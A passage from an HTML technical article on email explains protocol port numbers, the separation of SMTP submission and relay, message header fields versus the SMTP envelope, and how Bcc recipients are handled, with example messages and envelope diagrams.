    </thead>
    <tbody>
      <tr>
        <td><a href="#extended-simple-mail-transfer-protocol"><abbr title="Simple Mail Transfer Protocol">SMTP</abbr></a> for <a href="#submission-versus-relay">Submission</a></td>
        <td>465</td>
        <td>(587)</td>
      </tr>
      <tr>
        <td><a href="#extended-simple-mail-transfer-protocol"><abbr title="Simple Mail Transfer Protocol">SMTP</abbr></a> for <a href="#submission-versus-relay">Relay</a></td>
        <td>–</td>
        <td>25</td>
      </tr>
      <tr>
        <td><a href="#post-office-protocol-version-3"><abbr title="Post Office Protocol version 3">POP3</abbr></a></td>
        <td>995</td>
        <td>(110)</td>
      </tr>
      <tr>
        <td><a href="#internet-message-access-protocol"><abbr title="Internet Message Access Protocol">IMAP</abbr></a></td>
        <td>993</td>
        <td>(143)</td>
      </tr>
      <tr>
        <td><a href="#json-meta-application-protocol"><abbr title="JSON Meta Application Protocol">JMAP</abbr></a> via <a href="https://evalapply.org/internet/#hypertext-transfer-protocol"><abbr title="HyperText Transfer Protocol Secure">HTTPS</abbr></a></td>
        <td>443</td>
        <td>–</td>
      </tr>
      <tr>
        <td><a href="#filter-management-protocol">ManageSieve</a></td>
        <td>–</td>
        <td>4190</td>
      </tr>
    </tbody>
  </table>

  <figcaption>

The port numbers used by the various email protocols.</figcaption>
</figure>

<details>
  <summary id="smtp-for-relay-with-implicit-tls">
Why does <abbr title="Simple Mail Transfer Protocol">SMTP</abbr> for Relay have no port for Implicit <abbr title="Transport Layer Security">TLS</abbr>?
</summary>

  <p>First of all, we’ll talk in a minute about why <abbr title="Simple Mail Transfer Protocol">SMTP</abbr> is different for <a href="#submission-versus-relay">submission and relay</a>.
The <a href="https://datatracker.ietf.org/doc/html/rfc8314#section-7.3">official argument</a>
for why <abbr title="Simple Mail Transfer Protocol">SMTP</abbr> for Relay has no port for Implicit <abbr title="Transport Layer Security">TLS</abbr>
is that <a href="#address-resolution"><code>MX</code> records</a> have no way to indicate which port to use and thus port 25 has to be used.
In my opinion, this argumentation is misleading.
A more accurate answer is that the outgoing mail server had no secure way to discover
whether an incoming mail server supported <abbr title="Transport Layer Security">TLS</abbr> back then,
so opportunistic security was all one could hope for at the time.
(Manual configuration isn’t an option for relay and <abbr title="Domain Name System Security Extensions">DNSSEC</abbr> was standardized only in 2005 and deployed in 2010.)
Since opportunistic <abbr title="Transport Layer Security">TLS</abbr> is more easily accomplished with Explicit <abbr title="Transport Layer Security">TLS</abbr> rather than with Implicit <abbr title="Transport Layer Security">TLS</abbr>,
we’re stuck with Explicit <abbr title="Transport Layer Security">TLS</abbr> for message relay to this day,
even though incoming mail servers can now indicate their <abbr title="Transport Layer Security">TLS</abbr> capability
in a <a href="#dns-based-authentication-of-named-entities">secure way</a>.</p>

  <p>(In a <a href="https://en.wikipedia.org/wiki/SMTPS#History">twist of history</a>,
port 465 was shortly registered for <abbr title="Simple Mail Transfer Protocol">SMTP</abbr> for Relay with Implicit <abbr title="Transport Layer Security">TLS</abbr> in 1997 before it was revoked again in 1998
when <a href="https://datatracker.ietf.org/doc/html/rfc2487"><abbr title="Command to Start Transport Layer Security when available">STARTTLS</abbr> for <abbr title="Simple Mail Transfer Protocol">SMTP</abbr></a> was standardized.
Since some mailbox providers began to use this port for message submission with Implicit <abbr title="Transport Layer Security">TLS</abbr>,
port 465 was <a href="https://datatracker.ietf.org/doc/html/rfc8314#section-7.3">officially recognized</a> for this purpose in 2018.)</p>

</details>

<h3 id="delivery-protocols">Delivery protocols</h3>

<details>
  <summary id="submission-versus-relay">
Submission versus relay
</summary>

  <p>The <a href="#simple-mail-transfer-protocol">Simple Mail Transfer Protocol (<abbr title="Simple Mail Transfer Protocol">SMTP</abbr>)</a> is used for two different purposes:
The mail client uses it to submit a message to the outgoing mail server of its user,
while the outgoing mail server uses it to relay the message to the incoming mail servers of the recipients.
Originally, though, mail servers relayed messages from anyone to anyone.
This is called <a href="https://en.wikipedia.org/wiki/Open_mail_relay">open mail relay</a>.
In particular, there was no distinction between outgoing mail servers and incoming mail servers.
There were just <a href="#official-architecture">mail transfer agents</a>, which relayed messages among them.
Mail clients connected to mail transfer agents just like other mail transfer agents did
and asked them to deliver a given message for them.
This approach had two problems:</p>
  <ul>
    <li><strong>Abuse by spammers</strong>:
By routing their mail through relay servers of reputable organizations,
spammers made it difficult to block their messages based on their origin.
Additionally, a single message to a relay server could have a large number of recipients,
which allowed spammers to exploit the still costly bandwidth of others.
However, this also meant that a large number of spam messages were identical,
which made them relatively easy to filter out on the receiving side.</li>
    <li><strong>Unwanted rewriting</strong>:
Emails have to be in a certain <a href="#format">format</a> and mail servers started rewriting them
so that they adhere to the standard as well as to organization-specific policies.
However, relay servers are not supposed to modify messages,
and apparently, such modifications caused more harm than good.</li>
  </ul>

  <p>For these reasons, <a href="https://datatracker.ietf.org/doc/html/rfc2476"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 2476</a>
introduced a separation between submission and relay in 1998.
From then on, mail clients were expected to submit outgoing messages
<a href="https://datatracker.ietf.org/doc/html/rfc2476#section-3.1">on port 587 instead of port 25</a>
so that mail servers can handle them differently from relayed messages more easily.
The <abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> also allowed submission servers to <a href="https://datatracker.ietf.org/doc/html/rfc2476#section-6.2">require authentication</a>
before accepting a message.
In the late 90s, submission was often restricted based on the <abbr title="Internet Protocol">IP</abbr> address of the mail client.
Allowing submission only from within the organization meant,
though, that travelling employees couldn’t use the outgoing mail server of their organization.
Just a few months later, <abbr title="Simple Mail Transfer Protocol">SMTP</abbr> was extended with a flexible <a href="https://datatracker.ietf.org/doc/html/rfc2554">authentication mechanism</a>,
which is still in use today.
<abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 2476 also permitted submission servers to <a href="https://datatracker.ietf.org/doc/html/rfc2476#section-8">modify messages</a>
in specific ways with the intention that relay servers would stop doing so.
Equally importantly, the separation between submission and relay allowed the mail transfer agent of an organization
to reject all messages which were addressed to non-local users.
This is how the <a href="#simplified-architecture">modern email architecture</a>
with a server for outgoing mail and a server for incoming mail was born.</p>

  <p>As a consequence of this separation,
the original <abbr title="Simple Mail Transfer Protocol">SMTP</abbr> was split into two protocols:
One for submission and one for relay.
Apart from using different port numbers,
they differ mostly in their use of <a href="https://datatracker.ietf.org/doc/html/rfc6409#section-7"><abbr title="Simple Mail Transfer Protocol">SMTP</abbr> extensions</a>.
The submission protocol is specified most recently in <a href="https://datatracker.ietf.org/doc/html/rfc6409"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 6409</a>,
which also defines what a submission server <a href="https://datatracker.ietf.org/doc/html/rfc6409#section-4">has to do</a>,
what it <a href="https://datatracker.ietf.org/doc/html/rfc6409#section-5">should do</a>,
and what it <a href="https://datatracker.ietf.org/doc/html/rfc6409#section-6">may do</a>.
These aspects affect only how a submission server is supposed to behave
but not how mail clients communicate with the server.
This is why the two protocols are rarely distinguished when talking about <abbr title="Simple Mail Transfer Protocol">SMTP</abbr>.
For example, Wikipedia also has just a <a href="https://en.wikipedia.org/wiki/Simple_Mail_Transfer_Protocol">single article</a>
for the two protocols.
When a distinction is required, such as in technical documents,
the submission protocol is called <a href="https://www.iana.org/assignments/service-names-port-numbers/service-names-port-numbers.xhtml?search=submission">SUBMISSION</a>
(or <a href="https://www.iana.org/assignments/service-names-port-numbers/service-names-port-numbers.xhtml?search=submissions">SUBMISSIONS</a> when Implicit <abbr title="Transport Layer Security">TLS</abbr> is used),
while the relay protocol kept the name <a href="https://www.iana.org/assignments/service-names-port-numbers/service-names-port-numbers.xhtml?search=smtp"><abbr title="Simple Mail Transfer Protocol">SMTP</abbr></a>.
For the reason we discussed <a href="#smtp-for-relay-with-implicit-tls">above</a>,
<a href="https://www.iana.org/assignments/service-names-port-numbers/service-names-port-numbers.xhtml?search=smtps"><abbr title="Simple Mail Transfer Protocol Secure">SMTPS</abbr></a>
doesn’t exist.
This doesn’t stop Wikipedia from having an <a href="https://en.wikipedia.org/wiki/SMTPS">article about it</a>, though.
By now, you should also understand why the identifier used for the <a href="#autoconfiguration">autoconfiguration</a>
of a mail client is <code>_submission</code> and not <code>_smtp</code>.</p>

</details>

<details open="">
  <summary id="header-fields-and-body">
Header fields and body
</summary>

  <p>We’ll have a closer look at the format of messages in the <a href="#format">next chapter</a>,
but since we already want to transmit messages in this section,
we have to cover the basics now.
A message consists of several <a href="https://datatracker.ietf.org/doc/html/rfc5322#section-2.2">header fields</a>
and an optional <a href="https://datatracker.ietf.org/doc/html/rfc5322#section-2.3">body</a>,
which follows after an empty line.
Each header field has to be on a separate line but can,
<a href="#line-length-limit">if necessary</a>, span several lines.
Identical to <a href="https://evalapply.org/internet/#hypertext-transfer-protocol"><abbr title="HyperText Transfer Protocol">HTTP</abbr></a>,
header fields are formatted as <code>Name:</code> <code>Value</code>.
What follows is a simple example message.
You can find more examples in <a href="https://datatracker.ietf.org/doc/html/rfc5322#appendix-A"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 5322</a>.</p>

  <figure>

    <div><div><pre><code>From: Alice &lt;alice@example.org&gt;
To: Bob &lt;bob@example.com&gt;
Cc: Carol &lt;carol@example.com&gt;
Bcc: IETF &lt;ietf@ietf.org&gt;
Subject: A simple example message
Date: Thu, 01 Oct 2020 14:56:37 +0200
Message-ID: &lt;unique-identifier@example.org&gt;

Hello Bob,

I think we should switch our roles.
How about you contact me from now on?

Best regards,
Alice
</code></pre></div>    </div>

    <figcaption>

A simple example message with a <a href="#sender">sender</a>, three <a href="#recipients">recipients</a>, a <a href="#subject">subject</a>,
a <a href="#origination-date">date</a>, a <a href="#message-identification">message ID</a>, and a <a href="#body">body</a>.

</figcaption>
  </figure>

</details>

<details open="">
  <summary id="message-versus-envelope">
Message versus envelope
</summary>

  <p>While outgoing mail servers may <a href="#mandatory-header-fields">add missing header fields</a>
and <a href="#domainkeys-identified-mail">sign each message</a>,
incoming mail servers should only add <a href="#trace-information">trace information</a> to the top of a message
and leave the message as is otherwise.
The information relevant for handling the message,
such as the addresses to deliver the message to and the address to report failures to,
belongs to the so-called <a href="https://datatracker.ietf.org/doc/html/rfc5321#section-2.3.1">envelope</a>.
The envelope belongs to the <a href="#simple-mail-transfer-protocol">Simple Mail Transfer Protocol (<abbr title="Simple Mail Transfer Protocol">SMTP</abbr>)</a>,
and it can change completely during the delivery of a message.
The message, on the other hand, mostly stays the same during delivery,
and its format is also used by two <a href="#access-protocols">access protocols</a>.
The important thing to remember is that emails are delivered based on the addresses in the envelope
and not the addresses in the header section of the message.
Somewhat unfortunately, the fields in the envelope are called similarly to some header fields in the message:
<code>MAIL</code> <code>FROM</code> for the address to report failures to and <code>RCPT</code> <code>TO</code> for each address to deliver the message to.</p>

</details>

<details>
  <summary id="diverging-envelope-example">
Diverging envelope example
</summary>

  <p>Let’s have a look at how the <a href="#header-fields-and-body">above message</a> is delivered
in order to understand how the envelope addresses diverge from the message addresses:</p>

  <figure>
    <svg id="figure-message-envelope-submission" data-name="message-envelope-submission" width="666.966" height="250.5" viewBox="-1.25 -125.25 666.966 250.5" preserveAspectRatio="xMidYMid" xmlns="http://www.w3.org/2000/svg">

    <line x1="469.546" y1="0" x2="507.983" y2="0" marker-end="url(#arrow-green)" stroke-dasharray="31"></line>
    <line x1="155.546" y1="0" x2="194.921" y2="0"></line>
    <rect x="0" y="-41.75" width="155.233" height="83.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="77.617" y="-5.1"><tspan>Mail client</tspan> of</tspan><tspan x="77.617" y="16.9">alice@example.org</tspan>
    </text>
    <rect x="195.233" y="-124" width="274" height="248" rx="0" ry="0"></rect>
    <text text-anchor="start">
        <tspan x="212.233" y="-93.5"><tspan>Envelope</tspan></tspan><tspan x="212.233" y="-71.5">MAIL FROM:&lt;alice@example.org&gt;</tspan><tspan x="212.233" y="-49.5">RCPT TO:&lt;bob@example.com&gt;</tspan><tspan x="212.233" y="-27.5">RCPT TO:&lt;carol@example.com&gt;</tspan><tspan x="212.233" y="-5.5">RCPT TO:&lt;ietf@ietf.org&gt;</tspan>
    </text>
    <rect x="200.233" y="13.5" width="264" height="105.5" rx="0" ry="0"></rect>
    <text text-anchor="start">
        <tspan x="212.233" y="39"><tspan>Message</tspan></tspan><tspan x="212.233" y="61">From: Alice &lt;alice@example.org&gt;</tspan><tspan x="212.233" y="83">To: Bob &lt;bob@example.com&gt;</tspan><tspan x="212.233" y="105">Cc: Carol &lt;carol@example.com&gt;</tspan>
    </text>
    <rect x="509.233" y="-41.75" width="155.233" height="83.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="586.85" y="-16.1"><tspan>Outgoing</tspan></tspan><tspan x="586.85" y="5.9"><tspan>mail server</tspan></tspan><tspan x="586.85" y="27.9">of example.org</tspan>
    </text>

</svg>

    <figcaption>

<strong>Submission</strong>: The mail client of Alice <a href="#bcc-removal">removes the <code>Bcc</code> header field</a> from the message
and submits the message with all recipient addresses in the envelope,
including the ones of <code>Bcc</code> recipients, to the outgoing mail server.
<a href="#automatic-responses">Automatic responses</a> shall be sent to the mailbox of Alice.

</figcaption>
  </figure>

  <figure>
    <svg id="figure-message-envelope-bob" data-name="message-envelope-bob" width="666.966" height="228.5" viewBox="-1.25 -114.25 666.966 228.5" preserveAspectRatio="xMidYMid" xmlns="http://www.w3.org/2000/svg">

    <line x1="469.546" y1="0" x2="507.983" y2="0" marker-end="url(#arrow-green)" stroke-dasharray="31"></line>
    <line x1="155.546" y1="0" x2="194.921" y2="0"></line>
    <rect x="0" y="-41.75" width="155.233" height="83.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="77.617" y="-16.1"><tspan>Outgoing</tspan></tspan><tspan x="77.617" y="5.9"><tspan>mail server</tspan></tspan><tspan x="77.617" y="27.9">of example.org</tspan>
    </text>
    <rect x="195.233" y="-113" width="274" height="226" rx="0" ry="0"></rect>
    <text text-anchor="start">
        <tspan x="212.233" y="-82.5"><tspan>Envelope</tspan></tspan><tspan x="212.233" y="-60.5">MAIL FROM:&lt;alice@example.org&gt;</tspan><tspan x="212.233" y="-38.5">RCPT TO:&lt;bob@example.com&gt;</tspan><tspan x="212.233" y="-16.5">RCPT TO:&lt;carol@example.com&gt;</tspan>
    </text>
    <rect x="200.233" y="2.5" width="264" height="105.5" rx="0" ry="0"></rect>
    <text text-anchor="start">
        <tspan x="212.233" y="28"><tspan>Message</tspan></tspan><tspan x="212.233" y="50">From: Alice &lt;alice@example.org&gt;</tspan><tspan x="212.233" y="72">To: Bob &lt;bob@example.com&gt;</tspan><tspan x="212.233" y="94">Cc: Carol &lt;carol@example.com&gt;</tspan>
    </text>
    <rect x="509.233" y="-41.75" width="155.233" height="83.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="586.85" y="-16.1"><tspan>Incoming</tspan></tspan><tspan x="586.85" y="5.9"><tspan>mail server</tspan></tspan><tspan x="586.85" y="27.9">of example.com</tspan>
    </text>

</svg>

    <figcaption>

<strong>First relay</strong>: The outgoing mail server is now responsible
for delivering the message to the recipients that the mail client specified.
It sees that two recipient addresses are handled by the same domain
and delivers the message in a single envelope to the incoming mail server of this domain.
The outgoing mail server could also connect to the incoming mail server twice,
delivering the message once for Bob and once for Carol.
I don’t know which approach is more common in practice.
<a href="https://datatracker.ietf.org/doc/html/rfc5321#page-68"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 5321</a> just says that,
when the same message is delivered to multiple recipients in the same session,
it should be delivered with a command sequence of
<code>MAIL</code> <code>FROM</code>, <code>RCPT</code> <code>TO</code>, <code>RCPT</code> <code>TO</code>, <code>DATA</code> rather than
<code>MAIL</code> <code>FROM</code>, <code>RCPT</code> <code>TO</code>, <code>DATA</code>, <code>MAIL</code> <code>FROM</code>, <code>RCPT</code> <code>TO</code>, <code>DATA</code>.
We’ll discuss how the envelope corresponds to protocol messages <a href="#simple-mail-transfer-protocol">soon</a>.

</figcaption>
  </figure>

  <figure>
    <svg id="figure-message-envelope-caroline" data-name="message-envelope-caroline" width="666.966" height="206.5" viewBox="-1.25 -103.25 666.966 206.5" preserveAspectRatio="xMidYMid" xmlns="http://www.w3.org/2000/svg">

    <line x1="469.546" y1="0" x2="507.983" y2="0" marker-end="url(#arrow-green)" stroke-dasharray="31"></line>
    <line x1="155.546" y1="0" x2="194.921" y2="0"></line>
    <rect x="0" y="-41.75" width="155.233" height="83.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="77.617" y="-16.1"><tspan>Incoming</tspan></tspan><tspan x="77.617" y="5.9"><tspan>mail server</tspan></tspan><tspan x="77.617" y="27.9">of example.com</tspan>
    </text>
    <rect x="195.233" y="-102" width="274" height="204" rx="0" ry="0"></rect>
    <text text-anchor="start">
        <tspan x="212.233" y="-71.5"><tspan>Envelope</tspan></tspan><tspan x="212.233" y="-49.5">MAIL FROM:&lt;alice@example.org&gt;</tspan><tspan x="212.233" y="-27.5">RCPT TO:&lt;caroline@example.net&gt;</tspan>
    </text>
    <rect x="200.233" y="-8.5" width="264" height="105.5" rx="0" ry="0"></rect>
    <text text-anchor="start">
        <tspan x="212.233" y="17"><tspan>Message</tspan></tspan><tspan x="212.233" y="39">From: Alice &lt;alice@example.org&gt;</tspan><tspan x="212.233" y="61">To: Bob &lt;bob@example.com&gt;</tspan><tspan x="212.233" y="83">Cc: Carol &lt;carol@example.com&gt;</tspan>
    </text>
    <rect x="509.233" y="-41.75" width="155.233" height="83.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="586.85" y="-16.1"><tspan>Incoming</tspan></tspan><tspan x="586.85" y="5.9"><tspan>mail server</tspan></tspan><tspan x="586.85" y="27.9">of example.net</tspan>
    </text>

</svg>

    <figcaption>

<strong>Alias</strong>: The incoming mail server of <code>example.com</code> knows that
<code>carol@example.com</code> is an <a href="#alias-address">alias</a> for <code>caroline@example.net</code>.
It thus forwards the original message without any modifications to the incoming mail server of <code>example.net</code>.
A potential <a href="#bounce-messages">delivery failure</a> is still reported to Alice.

</figcaption>
  </figure>

  <figure>
    <svg id="figure-message-envelope-ietf" data-name="message-envelope-ietf" width="666.966" height="206.5" viewBox="-1.25 -103.25 666.966 206.5" preserveAspectRatio="xMidYMid" xmlns="http://www.w3.org/2000/svg">

    <line x1="469.546" y1="0" x2="507.983" y2="0" marker-end="url(#arrow-green)" stroke-dasharray="31"></line>
    <line x1="155.546" y1="0" x2="194.921" y2="0"></line>
    <rect x="0" y="-41.75" width="155.233" height="83.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="77.617" y="-16.1"><tspan>Outgoing</tspan></tspan><tspan x="77.617" y="5.9"><tspan>mail server</tspan></tspan><tspan x="77.617" y="27.9">of example.org</tspan>
    </text>
    <rect x="195.233" y="-102" width="274" height="204" rx="0" ry="0"></rect>
    <text text-anchor="start">
        <tspan x="212.233" y="-71.5"><tspan>Envelope</tspan></tspan><tspan x="212.233" y="-49.5">MAIL FROM:&lt;alice@example.org&gt;</tspan><tspan x="212.233" y="-27.5">RCPT TO:&lt;ietf@ietf.org&gt;</tspan>
    </text>
    <rect x="200.233" y="-8.5" width="264" height="105.5" rx="0" ry="0"></rect>
    <text text-anchor="start">
        <tspan x="212.233" y="17"><tspan>Message</tspan></tspan><tspan x="212.233" y="39">From: Alice &lt;alice@example.org&gt;</tspan><tspan x="212.233" y="61">To: Bob &lt;bob@example.com&gt;</tspan><tspan x="212.233" y="83">Cc: Carol &lt;carol@example.com&gt;</tspan>
    </text>
    <rect x="509.233" y="-41.75" width="155.233" height="83.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="586.85" y="-16.1"><tspan>Incoming</tspan></tspan><tspan x="586.85" y="5.9"><tspan>mail server</tspan></tspan><tspan x="586.85" y="27.9">of ietf.org</tspan>
    </text>

</svg>

    <figcaption>

<strong>Second relay</strong>: The outgoing mail server of Alice also has to deliver the message to the recipient <code>ietf@ietf.org</code>,
so it does that.

</figcaption>
  </figure>

  <figure>
    <svg id="figure-message-envelope-dave" data-name="message-envelope-dave" width="666.966" height="206.5" viewBox="-1.25 -103.25 666.966 206.5" preserveAspectRatio="xMidYMid" xmlns="http://www.w3.org/2000/svg">

    <line x1="469.546" y1="0" x2="507.983" y2="0" marker-end="url(#arrow-green)" stroke-dasharray="31"></line>
    <line x1="155.546" y1="0" x2="194.921" y2="0"></line>
    <rect x="0" y="-41.75" width="155.233" height="83.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="77.617" y="-16.1"><tspan>Incoming</tspan></tspan><tspan x="77.617" y="5.9"><tspan>mail server</tspan></tspan><tspan x="77.617" y="27.9">of ietf.org</tspan>
    </text>
    <rect x="195.233" y="-102" width="274" height="204" rx="0" ry="0"></rect>
    <text text-anchor="start">
        <tspan x="212.233" y="-71.5"><tspan>Envelope</tspan></tspan><tspan x="212.233" y="-49.5">MAIL FROM:&lt;admin@ietf.org&gt;</tspan><tspan x="212.233" y="-27.5">RCPT TO:&lt;dave@example.net&gt;</tspan>
    </text>
    <rect x="200.233" y="-8.5" width="264" height="105.5" rx="0" ry="0"></rect>
    <text text-anchor="start">
        <tspan x="212.233" y="17"><tspan>Message</tspan></tspan><tspan x="212.233" y="39">From: Alice &lt;alice@example.org&gt;</tspan><tspan x="212.233" y="61">To: Bob &lt;bob@example.com&gt;</tspan><tspan x="212.233" y="83">Cc: Carol &lt;carol@example.com&gt;</tspan>
    </text>
    <rect x="509.233" y="-41.75" width="155.233" height="83.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="586.85" y="-16.1"><tspan>Incoming</tspan></tspan><tspan x="586.85" y="5.9"><tspan>mail server</tspan></tspan><tspan x="586.85" y="27.9">of example.net</tspan>
    </text>

</svg>

    <figcaption>

<strong>Mailing list</strong>: It turns out that <code>ietf@ietf.org</code> is a <a href="#mailing-list">mailing list</a>.
It is now the task of the mail server of <code>ietf.org</code> to deliver the message to all subscribers of this list,
with one of them being <code>dave@example.net</code>.
<a href="https://datatracker.ietf.org/doc/html/rfc5321#section-3.9"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 5321</a> requires that
the <a href="https://en.wikipedia.org/wiki/Bounce_address">bounce address</a>
as specified in the <code>MAIL</code> <code>FROM</code> field of the envelope
is changed to the entity who administers the mailing list.
The entity can be a person but is typically a piece of software,
which keeps track of delivery failures in order to revise the list.
The <abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> also demands that the <code>From</code> field in the message remains the same.
<a href="https://en.wikipedia.org/wiki/List_of_mailing_list_software">Mailing list tools</a>
often modify the message in some ways,
for example by adding a field to the header and a footer to the body
in order to let recipients of the message <a href="#one-click-unsubscribe">unsubscribe from the mailing list</a>.
Alias addresses and mailing lists cause difficulties for <a href="#domain-authentication">domain authentication</a>.

</figcaption>
  </figure>

</details>

<details>
  <summary id="bcc-removal">

Who removes the Bcc header field?

</summary>

  <p>Is removing the <code>Bcc</code> field the job of the mail client or the job of the outgoing mail server?
The relevant standards are silent on this but <a href="https://ietf-822.imc.narkive.com/MS33RTCW/the-bcc-issue">experts agree</a>
that the software which constructs the envelope from the message is responsible for this.
If <abbr title="Simple Mail Transfer Protocol">SMTP</abbr> is used for submitting the message to the outgoing mail server
(rather than using one of the <a href="#double-submission-problem">custom approaches</a>),
the mail client has to remove the <code>Bcc</code> field for the primary (<code>To</code>) and secondary (<code>Cc</code>) recipients.
Since this is not clearly stated in the standard,
there existed (and maybe still exist) mail clients
which relied on the outgoing mail server to remove the <code>Bcc</code> field.
However, <a href="https://datatracker.ietf.org/doc/html/rfc6409"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 6409</a> lists <code>Bcc</code> removal
neither among the <a href="https://datatracker.ietf.org/doc/html/rfc6409#section-4">mandatory actions</a> nor among the
<a href="https://datatracker.ietf.org/doc/html/rfc6409#section-8">permitted message modifications</a> for outgoing mail servers.
While some outgoing mail server software, such as <a href="https://en.wikipedia.org/wiki/Postfix_(software)">Postfix</a>,
which is deployed on around 34% of the reachable mail servers on the Internet,
<a href="http://www.postfix.org/postconf.5.html#message_drop_headers">drop the <code>Bcc</code> header field</a> by default,
others, such as <a href="https://en.wikipedia.org/wiki/Exim">Exim</a>,
which is deployed on around 57% of the reachable mail servers on the Internet,
do so only if they are invoked with the
<a href="https://www.exim.org/exim-html-current/doc/html/spec_html/ch-the_exim_command_line.html#CHAPcommandline"><code>-t</code> option</a>.
(This option was introduced for use in <a href="https://en.wikipedia.org/wiki/Pipeline_(Unix)">pipelines</a>,
such as <code>cat message | sendmail -t</code>.)
As a result, users could end up with the list of <code>Bcc</code> recipients going through to non-<code>Bcc</code> recipients
depending on their specific combination of mail client and outgoing mail server software.
Since neither mail clients nor outgoing mail servers document how they treat <code>Bcc</code> recipients,
you have to send a test email to figure out the behavior of your particular setup.</p>

  <p><a href="https://datatracker.ietf.org/doc/html/rfc5322#section-3.6.3"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 5322</a> allows four different behaviors
when it comes to <code>Bcc</code> recipients, which we’ll study on the basis of another example:</p>

  <figure>

    <div><div><pre><code>From: Alice &lt;alice@example.org&gt;
To: Bob &lt;bob@example.com&gt;
Bcc: Carol &lt;carol@example.com&gt;, Dave &lt;dave@example.net&gt;
Subject: Followup to previous message
Date: Thu, 01 Oct 2020 15:04:26 +0200
Message-ID: &lt;another-identifier@example.org&gt;

Hi Bob,

I&#39;ve changed my mind. Please forget the previous message.

All the best,
Alice
</code></pre></div>    </div>

    <figcaption>

Another example message with several <code>Bcc</code> recipients.

</figcaption>
  </figure>

  <ul>
    <li><strong>Complete removal</strong>: The mail client removes the <code>Bcc</code> field from the message
 and delivers the message with a single envelope for all recipients to the outgoing mail server.
 We already encountered this behavior in the <a href="#message-versus-envelope">previous box</a>.
 As far as I can tell, this is by far the most common behavior in practice.</li>
  </ul>

  <figure>
    <svg id="figure-message-envelope-bcc-all" data-name="message-envelope-bcc-all" width="666.966" height="228.5" viewBox="-1.25 -114.25 666.966 228.5" preserveAspectRatio="xMidYMid" xmlns="http://www.w3.org/2000/svg">

    <line x1="469.546" y1="0" x2="507.983" y2="0" marker-end="url(#arrow-green)" stroke-dasharray="31"></line>
    <line x1="155.546" y1="0" x2="194.921" y2="0"></line>
    <rect x="0" y="-41.75" width="155.233" height="83.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="77.617" y="-5.1"><tspan>Mail client</tspan> of</tspan><tspan x="77.617" y="16.9">alice@example.org</tspan>
    </text>
    <rect x="195.233" y="-113" width="274" height="226" rx="0" ry="0"></rect>
    <text text-anchor="start">
        <tspan x="212.233" y="-82.5"><tspan>Envelope</tspan></tspan><tspan x="212.233" y="-60.5">MAIL FROM:&lt;alice@example.org&gt;</tspan><tspan x="212.233" y="-38.5">RCPT TO:&lt;bob@example.com&gt;</tspan><tspan x="212.233" y="-16.5">RCPT TO:&lt;carol@example.com&gt;</tspan><tspan x="212.233" y="5.5">RCPT TO:&lt;dave@example.net&gt;</tspan>
    </text>
    <rect x="200.233" y="24.5" width="264" height="83.5" rx="0" ry="0"></rect>
    <text text-anchor="start">
        <tspan x="212.233" y="50"><tspan>Message</tspan></tspan><tspan x="212.233" y="72">From: Alice &lt;alice@example.org&gt;</tspan><tspan x="212.233" y="94">To: Bob &lt;bob@example.com&gt;</tspan>
    </text>
    <rect x="509.233" y="-41.75" width="155.233" height="83.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="586.85" y="-16.1"><tspan>Outgoing</tspan></tspan><tspan x="586.85" y="5.9"><tspan>mail server</tspan></tspan><tspan x="586.85" y="27.9">of example.org</tspan>
    </text>

</svg>

    <figcaption>
The <code>Bcc</code> field is removed from the message for all recipients.
</figcaption>
  </figure>

  <ul>
    <li><strong>Grouped delivery</strong>: The mail client splits the recipients into two groups.
The non-<code>Bcc</code> recipients get the message in which the <code>Bcc</code> field is removed,
while the <code>Bcc</code> recipients get the original message,
in which all <code>Bcc</code> recipients are listed.</li>
  </ul>

  <figure>
    <svg id="figure-message-envelope-bcc-bob" data-name="message-envelope-bcc-bob" width="666.966" height="184.5" viewBox="-1.25 -92.25 666.966 184.5" preserveAspectRatio="xMidYMid" xmlns="http://www.w3.org/2000/svg">

    <line x1="469.546" y1="0" x2="507.983" y2="0" marker-end="url(#arrow-green)" stroke-dasharray="31"></line>
    <line x1="155.546" y1="0" x2="194.921" y2="0"></line>
    <rect x="0" y="-41.75" width="155.233" height="83.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="77.617" y="-5.1"><tspan>Mail client</tspan> of</tspan><tspan x="77.617" y="16.9">alice@example.org</tspan>
    </text>
    <rect x="195.233" y="-91" width="274" height="182" rx="0" ry="0"></rect>
    <text text-anchor="start">
        <tspan x="212.233" y="-60.5"><tspan>Envelope</tspan></tspan><tspan x="212.233" y="-38.5">MAIL FROM:&lt;alice@example.org&gt;</tspan><tspan x="212.233" y="-16.5">RCPT TO:&lt;bob@example.com&gt;</tspan>
    </text>
    <rect x="200.233" y="2.5" width="264" height="83.5" rx="0" ry="0"></rect>
    <text text-anchor="start">
        <tspan x="212.233" y="28"><tspan>Message</tspan></tspan><tspan x="212.233" y="50">From: Alice &lt;alice@example.org&gt;</tspan><tspan x="212.233" y="72">To: Bob &lt;bob@example.com&gt;</tspan>
    </text>
    <rect x="509.233" y="-41.75" width="155.233" height="83.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
